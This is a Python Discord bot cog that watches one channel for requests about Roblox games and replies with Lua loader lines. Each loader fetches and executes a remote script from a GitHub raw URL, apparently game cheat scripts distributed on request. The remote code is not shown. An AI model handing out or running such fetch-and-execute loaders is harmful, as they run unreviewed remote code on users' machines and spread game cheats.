import discord
from discord.ext import commands
import re
from datetime import datetime

GUILD_ID = 1347804635989016617
CHANNEL_ID = 1417960723363008722
OWNER_ID = 608461552034643992
OWNER_USERNAME = "ringta"
SCRIPT_LINKS = {
    "brainrot": 'loadstring(game:HttpGet("https://raw.githubusercontent.com/ringta9321/steala.github.io/refs/heads/main/brainrot.lua"))()',
    "forsaken": 'loadstring(game:HttpGet("https://raw.githubusercontent.com/34f3f/forsaken.github.io/refs/heads/main/ringtabublik.lua"))()',
    "adopt me": 'loadstring(game:HttpGet("https://raw.githubusercontent.com/eeeiqjj876y/adoptme.github.io/refs/heads/main/ringta.lua"))()',
    "ink games": 'loadstring(game:HttpGet("https://raw.githubusercontent.com/wefwef34/inkgames.github.io/refs/heads/main/ringta.lua"))()',
    "99 nights": 'loadstring(game:HttpGet("https://raw.githubusercontent.com/wehibuyfgyuwe/99nights.github.io/refs/heads/main/ringta.lua"))()',
    "dead rails": 'loadstring(game:HttpGet("https://raw.githubusercontent.com/erewe23/deadrailsring.github.io/refs/heads/main/ringta.lua"))()',
}
GAME_ALIASES = {
    "brainrot": ["steal a brainrot", "sab"],
    "forsaken": ["forsaken"],
    "adopt me": ["adopt me", "adoptme"],
    "ink games": ["ink games", "inkgames"],
    "99 nights": ["99 nights", "99night", "99nights", "forest"],
    "dead rails": ["dead rails", "deadrails"],
}
COOLDOWNS = {}

class ScriptHelperCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    def find_script_name(self, text):
        txt = text.lower()
        for key, aliases in GAME_ALIASES.items():
            for alias in aliases:
                if alias in txt:
                    return key
        return None

    def check_cooldown(self, user_id):
        now = datetime.utcnow()
        if user_id in COOLDOWNS:
            last = COOLDOWNS[user_id]
            if (now - last).total_seconds() < 15:
                return False
        COOLDOWNS[user_id] = now
        return True

    @commands.Cog.listener()
    async def on_message(self, message):
        if (
            message.author.bot or
            message.guild is None or
            message.guild.id != GUILD_ID or
            message.channel.id != CHANNEL_ID
        ):
            return

        user_id = message.author.id
        content = message.content.lower()

        if not self.check_cooldown(user_id):
            return

        script_name = self.find_script_name(content)
        is_asking_for_script = False
        is_script_not_working = False

        not_working_patterns = [
            r"why.*\b({game})\b.*script.*not\s*work",
            r"({game}).*script.*not\s*work",
            r"({game}).*script.*don.?t\s*work",
            r"({game}).*script.*erro?r",
            r"({game}).*script.*broken",
            r"({game}).*issue",
            r"({game}).*problem",
        ]
        if script_name:
            for pat in not_working_patterns:
                regex = pat.format(game=re.escape(script_name))
                if re.search(regex, content):
                    is_script_not_working = True
                    break
        if not is_script_not_working:
            generic_error_phrases = [
                "script not working",
                "script doesn't work",
                "script dont work",
                "script is broken",
                "script bug",
                "script error",
                "script issue",
                "script problem"
            ]
            if script_name and any(phrase in content for phrase in generic_error_phrases):
                is_script_not_working = True

        for_keyword = [
            r"where.?s the ({game}) script",
            r"(?:where to get|where.?s|get|link to|the script for|have|want).+({game})",
            r"(?:best|good).+script.+({game})",
            r"({game}).*script.*link",
            r"({game}).*script.*code",
            r"({game}).*script",
        ]
        if script_name and not is_script_not_working:
            for pat in for_keyword:
                regex = pat.format(game=re.escape(script_name))
                if re.search(regex, content):
                    is_asking_for_script = True
                    break
        if script_name and not is_script_not_working:
            generic_want_words = ["where", "script"]
            if all(x in content for x in generic_want_words) and script_name in content:
                is_asking_for_script = True

        if is_script_not_working:
            reply = (
                f"Make sure you used the correct script above. "
                f"If the error still continues, DM <@{OWNER_ID}> or ping {OWNER_USERNAME}."
            )
            await message.reply(reply, mention_author=True)
            return

        if is_asking_for_script and script_name in SCRIPT_LINKS:
            await message.reply(SCRIPT_LINKS[script_name], mention_author=True)
            return

def setup(bot):
    bot.add_cog(ScriptHelperCog(bot))
